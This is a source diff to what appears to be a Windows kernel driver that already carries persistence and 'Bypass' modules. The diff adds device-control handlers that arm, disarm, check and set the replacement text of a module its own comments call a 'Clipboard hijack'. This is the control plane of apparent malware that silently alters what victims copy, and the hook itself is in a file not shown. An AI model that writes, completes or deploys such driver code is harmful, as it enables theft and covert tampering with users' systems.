@@ -2,6 +2,7 @@
 #include "ProcessModule.h"
 #include "ThreadModule.h"
 #include "TaskPersistence.h"
+#include "ClipboardHook.h"
 #include "Bypass.h"
 #include "Shared.h"
 #include <ntddk.h>
@@ -208,6 +209,58 @@ NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
     if (inputLength >= sizeof(WCHAR) && inputLength / sizeof(WCHAR) < 512) {
       status = TaskPersistenceSetImagePath((PWCHAR)inputBuffer,
                                            inputLength / sizeof(WCHAR));
+      bytesReturned = 0;
+    } else {
+      status = STATUS_INVALID_BUFFER_SIZE;
+    }
+    break;
+
+  // ------------------------------------------------------
+  // Clipboard hijack module (see ClipboardHook.c)
+  // ------------------------------------------------------
+  case IOCTL_CLIP_ARM:
+    DbgPrint("CLIP_ARM requested.\n");
+    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
+      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
+      response->Status = ClipboardHookArm();
+      response->Data = 1;
+      bytesReturned = sizeof(DRIVER_RESPONSE);
+    } else {
+      status = STATUS_BUFFER_TOO_SMALL;
+    }
+    break;
+
+  case IOCTL_CLIP_DISARM:
+    DbgPrint("CLIP_DISARM requested.\n");
+    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
+      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
+      response->Status = ClipboardHookDisarm();
+      response->Data = 0;
+      bytesReturned = sizeof(DRIVER_RESPONSE);
+    } else {
+      status = STATUS_BUFFER_TOO_SMALL;
+    }
+    break;
+
+  case IOCTL_CLIP_STATUS:
+    DbgPrint("CLIP_STATUS requested.\n");
+    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
+      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
+      BOOLEAN armed = FALSE;
+      response->Status = ClipboardHookStatus(&armed);
+      response->Data = armed ? 1 : 0;
+      bytesReturned = sizeof(DRIVER_RESPONSE);
+    } else {
+      status = STATUS_BUFFER_TOO_SMALL;
+    }
+    break;
+
+  case IOCTL_CLIP_SET_TEXT:
+    DbgPrint("CLIP_SET_TEXT requested.\n");
+    if (inputLength >= sizeof(WCHAR) &&
+        inputLength / sizeof(WCHAR) <= CLIP_MAX_TEXT_CHARS) {
+      status = ClipboardHookSetText((PWCHAR)inputBuffer,
+                                    inputLength / sizeof(WCHAR));
       bytesReturned = 0;
     } else {
       status = STATUS_INVALID_BUFFER_SIZE;
